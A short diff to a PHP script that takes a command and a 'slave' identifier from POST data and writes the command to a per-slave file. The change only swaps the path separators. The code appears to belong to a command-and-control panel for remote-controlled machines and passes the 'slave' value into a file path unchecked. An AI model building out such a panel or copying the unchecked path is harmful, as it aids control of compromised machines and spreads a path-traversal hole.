@@ -34,7 +34,7 @@ if (!empty($_POST["cmd"])){
   $realtime_cmd = $_POST["cmd"];
   $slavewatermark = $_POST["slave"]; 
   
-  $fp = fopen("slave\\$slavewatermark\\realtimecmd.txt", "w+");
+  $fp = fopen("slave/$slavewatermark/realtimecmd.txt", "w+");
 
   fwrite($fp, urldecode($realtime_cmd));
 
